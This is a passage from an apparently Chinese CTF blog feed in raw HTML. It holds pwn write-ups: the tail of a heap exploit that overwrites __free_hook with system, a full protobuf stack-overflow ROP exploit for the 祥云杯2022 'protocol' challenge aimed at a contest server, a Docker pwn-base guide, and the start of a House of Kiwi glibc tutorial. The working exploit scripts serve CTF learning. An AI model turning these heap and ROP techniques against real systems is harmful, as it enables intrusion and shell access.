class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-built_in">str</span>(idx)<br>    io.sendline(payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Waiting Package...&#x27;</span>)   <br>    payload = <span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span>+<span class="hljs-string">&#x27;\x03&#x27;</span>+<span class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-built_in">str</span>(idx)<br>    io.sendline(payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,text</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Waiting Package...&#x27;</span>)   <br>    payload = <span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span>+<span class="hljs-string">&#x27;\x02&#x27;</span>+<span class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-built_in">str</span>(idx)+<span class="hljs-string">&#x27;&amp;&#x27;</span>+ text<br>    io.sendline(payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>    gdb.attach(proc.pidof(io)[<span class="hljs-number">0</span>])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    login()<br>    <span class="hljs-comment"># pause()</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        create(i,<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><br>    free(<span class="hljs-number">0</span>)    <br>    show(<span class="hljs-number">0</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Content-Length: 5\n&#x27;</span>)<br>    <span class="hljs-comment"># io.recvline()</span><br>    key = u64(io.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heapbase = key&lt;&lt;<span class="hljs-number">12</span><br>    <br>   <br>    <span class="hljs-comment"># edit(7,&#x27;a\x00&#x27;)</span><br>    create(<span class="hljs-number">7</span>,<span class="hljs-number">0x420</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>    create(<span class="hljs-number">8</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>    free(<span class="hljs-number">7</span>)<br>    <span class="hljs-comment"># p()</span><br>    create(<span class="hljs-number">9</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;cc&#x27;</span>)<br>    <span class="hljs-comment"># p()</span><br>    show(<span class="hljs-number">7</span>)<br>    <span class="hljs-comment"># p()</span><br>    io.recvuntil(<span class="hljs-string">&#x27;Content-Length: 6\n&#x27;</span>)<br>    libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1e0ff0</span><br>    success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>    success(<span class="hljs-string">&quot;key--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(key))<br>    success(<span class="hljs-string">&quot;heapbase--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(heapbase))<br>    <br>    free_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]    <br>    <span class="hljs-comment"># free(0)</span><br>    <br>    create(<span class="hljs-number">11</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>    create(<span class="hljs-number">12</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>    create(<span class="hljs-number">13</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>    free(<span class="hljs-number">11</span>)<br>    free(<span class="hljs-number">12</span>)<br>    edit(<span class="hljs-number">12</span>,p64(free_hook^key))<br>    <span class="hljs-comment"># p()</span><br>    create(<span class="hljs-number">14</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>    create(<span class="hljs-number">15</span>,<span class="hljs-number">0x30</span>,p64(system_addr))<br>    free(<span class="hljs-number">14</span>)<br>    success(<span class="hljs-string">&#x27;free_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(free_hook))<br>    success(<span class="hljs-string">&#x27;system--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(system_addr))<br>    <br>    <span class="hljs-comment"># p()</span><br>       <br>    <br>    io.interactive()<br>    <br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【祥云杯2022】PWN-WriteUp-protocol</title>
    <link href="/2022/11/01/%E3%80%90%E7%A5%A5%E4%BA%91%E6%9D%AF2022%E3%80%91PWN-WriteUp-protocol/"/>
    <url>/2022/11/01/%E3%80%90%E7%A5%A5%E4%BA%91%E6%9D%AF2022%E3%80%91PWN-WriteUp-protocol/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次见到google protobuf类型的题目，虽然是到签到题，但还是学到了一些新的东西</p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>首先导入文件，当我看到左侧密密麻麻的无名函数就感受到了一丝不对劲</p><p><img src="/img/article/protocol/image-20221101210554873.png" alt="image-20221101210554873"></p><p>先运行一下程序，发现输出了一个<code>Login:</code></p><p><img src="/img/article/protocol/image-20221101210642159.png" alt="image-20221101210642159"></p><p>通过这个字符串定位到主函数位置</p><p><img src="/img/article/protocol/image-20221101210733818.png" alt="image-20221101210733818"></p><p><img src="/img/article/protocol/image-20221101210746869.png" alt="image-20221101210746869"></p><p>基本可以确定是去掉符号表了，这样直接逆向显然不太行。先看看程序编译的环境是什么，然后重新导入一个sig</p><p><img src="/img/article/protocol/image-20221101210857157.png" alt="image-20221101210857157"></p><p>成功确定版本<code>Ubuntu 9.4.0-1ubuntu1~20.04.1</code>,这个版本的libc应该是2.31，找一个对应的sig文件导入即可</p><blockquote><p>这里推荐一个sig-database：<a href="https://github.com/push0ebp/sig-database">IDA FLIRT Signature Database</a></p><p>基本能找到绝大多数系统对应的sig</p></blockquote><p>通过刚刚的<code>stirngs</code>基本可以确定是这个了，下下来然后放入，<code>IDA/sig/pc</code>目录</p><p><img src="/img/article/protocol/image-20221101211407158.png" alt="image-20221101211407158"></p><p>在IDA中导入，效果展示：</p><p><img src="/img/article/protocol/image-20221101211626952.png" alt="image-20221101211626952"></p><p>虽然还是有点难逆，但是好很多了，进入<code>sub_625110</code>函数</p><p><img src="/img/article/protocol/image-20221101211743614.png" alt="image-20221101211743614"></p><p><img src="/img/article/protocol/image-20221101211735339.png" alt="image-20221101211735339"></p><p>基本确定是个起到<code>strcpy</code>作用的函数，将我们输入的全局变量拷贝到栈上，但是不考虑目标地的大小，同样是有栈溢出。但是其中有几个限制</p><ul><li>字符串中不能含有<strong>\x00</strong>（意味着不能直接使用ROP）</li><li>拷贝进入栈内时会在末尾添置一个<strong>\x00</strong></li></ul><p><img src="/img/article/protocol/image-20221101211937850.png" alt="image-20221101211937850"></p><p>保护也基本没开，大概可以直接利用。</p><h2 id="Google-protobuf"><a href="#Google-protobuf" class="headerlink" title="Google protobuf"></a>Google protobuf</h2><p>在字符串内看到<code>google protobuf</code>,应该是这个相关题目</p><blockquote><p>比赛的时候看这篇博客临时学习了一下：<a href="https://bbs.pediy.com/thread-270004.htm">2021第五空间 pb WP</a></p></blockquote><p><img src="/img/article/protocol/image-20221101212029433.png" alt="image-20221101212029433"></p><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>首先找到最新版本的protobuf：<a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a><br>我这里下载的是：protobuf-cpp-3.21.9.tar.gz</p><p>下载并安装protobuf，注意需要<strong>root</strong>权限，且必须在root账户下操作，sudo+指令不太行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -xzvf protobuf-cpp-3.21.9.tar.gz<br>cd protobuf-3.21.9<br>./autogen.sh<br>./configure --prefix=/usr/local/protobuf<br>make -j8 &amp;&amp; make install<br>ldconfig<br></code></pre></td></tr></table></figure><p>安装完成之后，需要配置protobuf命令，更新环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在/etc/profile文件中添加下面两行</span><br>export PATH=$PATH:/usr/local/protobuf/bin/<br>export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/<br><span class="hljs-meta prompt_"># </span><span class="language-bash">然后执行</span><br>source /etc/profile<br></code></pre></td></tr></table></figure><p>配置动态链接库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在文件/etc/ld.so.conf中添加下面一行</span><br>/usr/local/protobuf/lib #（注意: 在新行处添加）<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">更改完成之后执行下面的命令</span><br>ldconfig<br></code></pre></td></tr></table></figure><p>配置好相关环境后，按照如下操作，分解出了<code>ctf_pb2.py</code>和<code>ctf.proto</code>文件</p><p>使用自动化工具分析提取.py文件：<a href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip3 install protobuf<br>./extractors/from_binary.py [-h] input_file [output_dir] # 得到ctf.ptoto<br><br>pip3 install google<br>pip3 install protobuf<br>protoc -I=./ --python_out=./ ctf.proto  # 得到ctf_pb2.py<br></code></pre></td></tr></table></figure><p><img src="/img/article/protocol/image-20221101212237685.png" alt="image-20221101212237685"></p><blockquote><p>如果显示没有proto指令，可以安装protobuf-compiler后再次尝试</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install protobuf-compiler<br></code></pre></td></tr></table></figure><p>.proto文件里存放了message的结构信息</p><p><img src="/img/article/protocol/image-20221101212357009.png" alt="image-20221101212357009"></p><p>然后将py文件作为库导入，即可利用它的接口完成消息传递，我传递message的函数如下定义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">new_pwn</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recvuntil(<span class="hljs-string">&#x27;Login: &#x27;</span>)<br>    person = pwn()<br>    person.username = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    person.password = payload<br>    io.send(person.SerializeToString())<br></code></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>综合上述分析，我们在送入password时存在溢出漏洞，但是ROP中的含有的<strong>\x00</strong>难以直接送入。但是我们可以利用while循环多次送入不同长度的字符串，使得字符串结尾添加的<strong>\x00</strong>被我们利用。同时需要注意的是，这种情况下，我们需要倒着一点一点写好ROP，**&#x2F;bin&#x2F;sh**的字符串我们可以在最后写入全局变量，只要记住对应地址即可，同时结束while循环调用ROP链。</p><p><img src="/img/article/protocol/image-20221101214354465.png" alt="image-20221101214354465"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctf_pb2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn  <span class="hljs-keyword">import</span> *<br><br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new_pwn</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-keyword">global</span> io<br>    io.recvuntil(<span class="hljs-string">&#x27;Login: &#x27;</span>)<br>    person = pwn()<br>    person.username = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    person.password = payload<br>    io.send(person.SerializeToString())<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*num + <span class="hljs-string">b&#x27;c&#x27;</span>*(<span class="hljs-number">8</span>-i)<br>        new_pwn(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">mode,ip = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> io<br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">0</span>:<br>        io = process(<span class="hljs-string">&#x27;./protocol&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        io = remote(ip,port)<br>    <br>    <span class="hljs-comment">#0x0000000000403c99 : syscall</span><br>    <span class="hljs-comment">#binsh</span><br>    <span class="hljs-comment">#0x0000000000404982 : pop rdi ; ret</span><br>    <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#0x0000000000588bbe : pop rsi ; ret</span><br>    <span class="hljs-comment">#59</span><br>    <span class="hljs-comment">#0x00000000005bdb8a : pop rax ; ret</span><br>    <span class="hljs-comment">#0</span><br>    <span class="hljs-comment">#0x000000000040454f : pop rdx ; ret</span><br>    <br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> +<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;\x99\x3c\x40&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x38</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">b&#x27;\x6f\xa3\x81&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x30</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x30</span> + <span class="hljs-string">b&#x27;\x82\x49\x40&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x28</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x28</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x20</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">b&#x27;\xbe\x8b\x58&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x18</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + <span class="hljs-string">b&#x27;\x3b&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x10</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;\x8a\xdb\x5b&#x27;</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x8</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x08</span><br>    new_pwn(payload)<br>    <br>    clear(<span class="hljs-number">0x0</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x248</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x00</span> + <span class="hljs-string">b&#x27;\x4f\x45\x40&#x27;</span><br>    new_pwn(payload)<br>    <br>    pause()<br>    io.recvuntil(<span class="hljs-string">&#x27;Login:&#x27;</span>)<br>    person = pwn()<br>    person.username = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    person.password = <span class="hljs-string">b&#x27;admin&#x27;</span><br>    payload = person.SerializeToString() + <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>    io.send(payload)<br>    <br>    <br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;210.30.97.133&#x27;</span>,<span class="hljs-number">28091</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>适用多版本libc的pwn-base</title>
    <link href="/2022/10/28/%E9%80%82%E7%94%A8%E5%A4%9A%E7%89%88%E6%9C%AClibc%E7%9A%84pwn-base/"/>
    <url>/2022/10/28/%E9%80%82%E7%94%A8%E5%A4%9A%E7%89%88%E6%9C%AClibc%E7%9A%84pwn-base/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于经常要在校内的CTFd平台上题，不使用pwn-base的构建方式会使得镜像体积过大，浪费许多服务器的存储空间。但使用pwn-base的情况下，不同题目libc要求不同，又需要构建多个pwn-base环境，过于麻烦。因而创建了这个可根据需求自行更换libc版本的pwn-base，有需要可以自己下载源码更改，链接在下方：</p><blockquote><p>docker：loora1n&#x2F;Ubuntu2.35</p><p>链接：<a href="https://github.com/Loora1N/pwnbase/tree/main/Ubuntu2.35">pwnbase&#x2F;Ubuntu2.35 at main · Loora1N&#x2F;pwnbase (github.com)</a></p></blockquote><p>这个库里同时还包含之前制作的Kernel pwn base</p><p><img src="/img/article/pwnbase/image-20221028202807333.png" alt="pwnbase"></p><h2 id="默认libc版本"><a href="#默认libc版本" class="headerlink" title="默认libc版本"></a>默认libc版本</h2><blockquote><p>GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 11.2.0. libc ABIs: UNIQUE IFUNC ABSOLUTE For bug reporting instructions, please see: <a href="https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs">https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs</a>.</p></blockquote><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>首先在创建一个文件夹用于构建你的题目镜像，如我这里的pwn文件夹</p><p><img src="/img/article/pwnbase/image-20221028203034274.png" alt="题目文件夹"></p><p>将你的题目和所需的libc, ld文件也放入这里，新建一个Dockerfile，粘贴如下内容即可</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> loora1n/ubuntu2.<span class="hljs-number">35</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> helloworld /pwn/pwn</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> ld-2.32.so /pwn/ld-2.32.so</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> libc-2.32.so /pwn/libc-2.32.so</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /pwn/pwn &amp;&amp; \</span><br><span class="language-bash">    patchelf --set-interpreter /pwn/ld-2.32.so /pwn/pwn &amp;&amp; \</span><br><span class="language-bash">    patchelf --replace-needed libc.so.6 /pwn/libc-2.32.so /pwn/pwn   </span><br></code></pre></td></tr></table></figure><p>只需替换<code>COPY</code>后紧挨着的文件名即可，我这里以libc版本需求为2.32的helloworld为例。</p><p>保存后，开始构建题目镜像即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build -t usrname/image .<br>docker push usrname/image<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IO_FILE】House of kiwi</title>
    <link href="/2022/10/27/%5BIO_FILE%5DHouse%20of%20kiwi/"/>
    <url>/2022/10/27/%5BIO_FILE%5DHouse%20of%20kiwi/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>参考博客如下：</p><p><a href="https://bbs.pediy.com/thread-273746.htm">从PWN题NULL_FXCK中学到的glibc知识</a></p><p><a href="https://www.anquanke.com/post/id/235598">House OF Kiwi</a></p></blockquote><p>CTF的Pwn题里面,通常就会遇到一些加了沙盒的题目,这种加沙盒的题目,在2.29之后的堆题中,通常为以下两种方式</p><ul><li>劫持<code>__free_hook</code>,利用特定的gadget,将栈进行迁移</li><li>劫持<code>__malloc_hook</code>为<code>setcontext+61</code>的gadget,以及劫持<code>IO_list_all</code>单链表中的指针在exit结束中,在<code>_IO_cleanup</code>函数会进行缓冲区的刷新,从而读取flag</li></ul><p>因为<code>setcontext + 61</code>从2.29之后变为由RDX寄存器控制寄存器了,所以需要控制RDX寄存器的指向的位置的部分数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;setcontext+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]<br>&lt;setcontext+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]<br>&lt;setcontext+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]<br>&lt;setcontext+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]<br>&lt;setcontext+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]<br>&lt;setcontext+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]<br>&lt;setcontext+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]<br>&lt;setcontext+95&gt;:    test   DWORD PTR fs:0x48,0x2<br>&lt;setcontext+107&gt;:    je     0x7ffff7e31156 &lt;setcontext+294&gt;<br>...<br>&lt;setcontext+294&gt;:    mov    rcx,QWORD PTR [rdx+0xa8]<br>&lt;setcontext+301&gt;:    push   rcx<br>&lt;setcontext+302&gt;:    mov    rsi,QWORD PTR [rdx+0x70]<br>&lt;setcontext+306&gt;:    mov    rdi,QWORD PTR [rdx+0x68]<br>&lt;setcontext+310&gt;:    mov    rcx,QWORD PTR [rdx+0x98]<br>&lt;setcontext+317&gt;:    mov    r8,QWORD PTR [rdx+0x28]<br>&lt;setcontext+321&gt;:    mov    r9,QWORD PTR [rdx+0x30]<br>&lt;setcontext+325&gt;:    mov    rdx,QWORD PTR [rdx+0x88]<br>&lt;setcontext+332&gt;:    xor    eax,eax<br>&lt;setcontext+334&gt;:    ret<br></code></pre></td></tr></table></figure><p>但是如果将exit函数替换成<code>_exit</code>函数,最终结束的时候,则是进行了syscall来结束,并没有机会调用<code>_IO_cleanup</code>,若再将<code>__malloc_hook</code>和<code>__free_hook</code>给ban了,且在输入和输出都用read和write的情况下,无法hook且无法通过IO刷新缓冲区进行调用,这时候就涉及到ptmalloc源码里面了</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>能够触发<code>_malloc_assert</code>，通常由堆溢出导致</li><li>能够任意地址写，修改 <code>_IO_file_sync</code> 和<code>IO_helper_jumps + 0xA0 and 0xA8</code></li></ul><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p><code>glibc</code>中<code>ptmalloc</code>部分,从以前到现在都存在一个<code>assret</code>断言的问题,此处存在一个<code>fflush(stderr)</code>的函数调用,其中会调用<code>_IO_file_jumps</code>中的<code>sync</code>指针</p><blockquote><p>GLibc 2.32&#x2F;malloc:288</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>__malloc_assert (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *assertion, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> line,<br>       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *function)<br>&#123;<br>(<span class="hljs-type">void</span>) __fxprintf (<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,<br>           __progname, __progname[<span class="hljs-number">0</span>] ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           file, line,<br>           function ? function : <span class="hljs-string">&quot;&quot;</span>, function ? <span class="hljs-string">&quot;: &quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>           assertion);<br>fflush (<span class="hljs-built_in">stderr</span>);<br><span class="hljs-built_in">abort</span> ();<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p> 这里放一个我常用来查询glibc源码的网址：<a href="https://elixir.bootlin.com/glibc/latest/source">Glibc source code - Bootlin</a></p></blockquote><p><img src="/img/article/house_of_kiwi/image-20221026101620627-1666750587623-2.png" 